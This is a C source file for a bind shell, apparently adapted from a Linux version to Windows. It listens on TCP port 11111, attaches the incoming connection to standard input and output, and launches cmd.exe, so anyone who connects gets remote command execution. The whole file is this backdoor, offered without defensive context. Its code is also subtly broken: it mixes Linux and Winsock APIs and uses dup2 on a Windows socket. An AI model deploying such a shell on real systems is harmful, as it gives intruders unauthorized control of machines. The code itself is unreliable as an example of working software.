#include <WinSock2.h>
//#include <sys/socket.h>
#include <sys/types.h>
//#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>
 
int main()
{
 
    int resultfd, sockfd;
    int port = 11111;
    struct sockaddr_in my_addr;
    
    WORD wVersionRequested; 
	WSADATA wsaData; 
	int err; 
	wVersionRequested = MAKEWORD(1, 1); 
 
	err = WSAStartup(wVersionRequested, &wsaData); 
 
	if (err != 0) 
    /* Tell the user that we couldn't find a useable */ 
    /* winsock.dll.     */ 
    	return; 
 	
 	printf("77777");
    // syscall 102
    // int socketcall(int call, unsigned long *args);
 
    // sycall socketcall (sys_socket 1)
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
 
    // syscall socketcall (sys_setsockopt 14)
    int one = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
 
    // set struct values
    my_addr.sin_family = AF_INET; // 2
    my_addr.sin_port = htons(port); // port number
    my_addr.sin_addr.s_addr = INADDR_ANY; // 0 fill with the local IP
 
    // syscall socketcall (sys_bind 2)
    bind(sockfd, (struct sockaddr *) &my_addr, sizeof(my_addr));
 
    // syscall socketcall (sys_listen 4)
    listen(sockfd, 0);
 
    // syscall socketcall (sys_accept 5)
    resultfd = accept(sockfd, NULL, NULL);
 
    // syscall 63
    dup2(resultfd, 0);
    close (resultfd);
    dup2(0, 1);
    dup2(0, 2);
    
    
 
    // syscall 11
    //execl("c:\\windows\\system32\\cmd.exe", "c:\\windows\\system32\\cmd.exe", NULL);
    execlp("cmd.exe", "cmd.exe", NULL);
    //system("cmd.exe");
    //os.system("cmd.exe");
 
    return 0;
}
